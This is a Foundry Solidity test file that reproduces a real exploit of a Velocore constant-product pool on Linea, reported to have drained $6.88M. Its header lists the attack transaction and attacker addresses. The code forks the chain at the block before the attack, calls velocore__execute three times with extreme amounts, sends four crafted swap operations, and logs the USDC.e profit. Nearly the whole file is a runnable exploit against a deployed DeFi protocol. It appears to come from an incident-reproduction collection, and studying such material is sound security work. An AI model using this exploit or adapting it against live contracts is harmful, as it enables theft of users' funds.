// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 	$6.88M
// Attack Tx : https://lineascan.build/tx/0xed11d5b013bf3296b1507da38b7bcb97845dd037d33d3d1b0c5e763889cdbed1
// Attacker Address : https://lineascan.build/address/0x8cdc37ed79c5ef116b9dc2a53cb86acaca3716bf
// Attack Contract : https://lineascan.build/address/0xb7f6354b2cfd3018b3261fbc63248a56a24ae91a

// @Analysis: https://x.com/BeosinAlert/status/1797247874528645333

interface ConstantProductPool{

    type Token is bytes32;

    function velocore__execute(
        address,
        bytes32[] calldata tokens,
        int128[] memory r,
        bytes calldata data
    ) external returns (int128[] memory, int128[] memory);

    function totalSupply() external view returns (uint256);

    function poolBalances() external view returns (uint256[] memory);

}

struct VelocoreOperation {
    bytes32 poolId;
    bytes32[] tokenInformations;
    bytes data;
}

interface SwapFacet{

    type Token is bytes32;

    function execute(
        bytes32[] memory tokens,
        int128[] memory deposit,
        VelocoreOperation[] memory ops
    ) external payable;

}


contract ContractTest is Test {

    type Token is bytes32;

    address USDC_ETH_VLP = 0xe2c67A9B15e9E7FF8A9Cb0dFb8feE5609923E5DB;

    address swapfacet = 0x1d0188c4B276A09366D05d6Be06aF61a73bC7535;

    address USDC_e = 0x176211869cA2b568f2A7D4EE941E073a821EE1ff;

    bytes32 USDC_e_bytes32 = 0x000000000000000000000000176211869ca2b568f2a7d4ee941e073a821ee1ff;

    bytes32 ETH_bytes32 = 0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee;

    bytes32 USDC_ETH_VLP_bytes32 = 0x000000000000000000000000e2c67a9b15e9e7ff8a9cb0dfb8fee5609923e5db;





    function setUp() public {
        vm.createSelectFork("https://linea.drpc.org", 5079177 - 1);
    }

    function testExploit() public {

        // 1. Check the total Supply Before Attack of VLP 
        uint256  totalSupplyBeforeAttack = ConstantProductPool(USDC_ETH_VLP).totalSupply();

        // console.log("total Supply Before Attack:", totalSupplyBeforeAttack);

        // 2. Call velocore__execute function three times with same parameters

        bytes32[] memory tokens = new bytes32[](2);

        tokens[0] = USDC_e_bytes32;
        tokens[1] = USDC_ETH_VLP_bytes32;

        int128[] memory amounts = new int128[](2);

        amounts[0] = 170141183460469231731687303715884105727;
        amounts[1] = 8616292632827688;

        ConstantProductPool(USDC_ETH_VLP).velocore__execute(address(this), tokens, amounts, hex"");

        ConstantProductPool(USDC_ETH_VLP).velocore__execute(address(this), tokens, amounts, hex"");

        ConstantProductPool(USDC_ETH_VLP).velocore__execute(address(this), tokens, amounts, hex"");

        // 3. Check the balance of USDC_ETH_VLP

        uint256[] memory a = ConstantProductPool(USDC_ETH_VLP).poolBalances();

        // 4. Call Valut.SwapFacet execute function with 4 ops

        bytes32[] memory tokenRef = new bytes32[](3);

        tokenRef[0] = USDC_e_bytes32;

        tokenRef[1] = ETH_bytes32;

        tokenRef[2] = USDC_ETH_VLP_bytes32;

        int128[] memory deposit = new int128[](3);

        deposit[0] = 0;
        deposit[1] = 0;
        deposit[2] = 0;

        VelocoreOperation[] memory ops = new VelocoreOperation[](4);

        ops[0].poolId = USDC_ETH_VLP_bytes32;

        ops[0].tokenInformations = new bytes32[](3);

        ops[0].tokenInformations[0] = 0x00000000000000000000000000000000ffffffffffffffffffffff787406ca5f;
        ops[0].tokenInformations[1] = 0x010100000000000000000000000000007fffffffffffffffffffffffffffffff;
        ops[0].tokenInformations[2] = 0x020100000000000000000000000000007fffffffffffffffffffffffffffffff;
        ops[0].data = "";

        ops[1].poolId = USDC_ETH_VLP_bytes32;

        ops[1].tokenInformations = new bytes32[](3);

        ops[1].tokenInformations[0] = 0x00000000000000000000000000000000fffffffffffffffffffffffd4a0022c4;
        ops[1].tokenInformations[1] = 0x010100000000000000000000000000007fffffffffffffffffffffffffffffff;
        ops[1].tokenInformations[2] = 0x020100000000000000000000000000007fffffffffffffffffffffffffffffff;
        ops[1].data = "";

        ops[2].poolId = USDC_ETH_VLP_bytes32;

        ops[2].tokenInformations = new bytes32[](3);

        ops[2].tokenInformations[0] = 0x00000000000000000000000000000000fffffffffffffffffffffffff21eb904;
        ops[2].tokenInformations[1] = 0x010100000000000000000000000000007fffffffffffffffffffffffffffffff;
        ops[2].tokenInformations[2] = 0x020100000000000000000000000000007fffffffffffffffffffffffffffffff;
        ops[2].data = "";

        ops[3].poolId = USDC_ETH_VLP_bytes32;

        ops[3].tokenInformations = new bytes32[](2);

        ops[3].tokenInformations[0] = 0x00000000000000000000000000000000ffffffffffffffffffffffffffffd8f0;
        ops[3].tokenInformations[1] = 0x020100000000000000000000000000007fffffffffffffffffffffffffffffff;

        ops[3].data = "";

        SwapFacet(swapfacet).execute(tokenRef, deposit, ops);

        // 5. Check the profit after attack 

        uint256 usdc_e_balance = IERC20(USDC_e).balanceOf(address(this));

        console.log("---------------------------------------------------");
        console.log("USDC_e profit after attack: $", usdc_e_balance / 10**6);
        console.log("---------------------------------------------------");
    }


    receive() external payable {}

}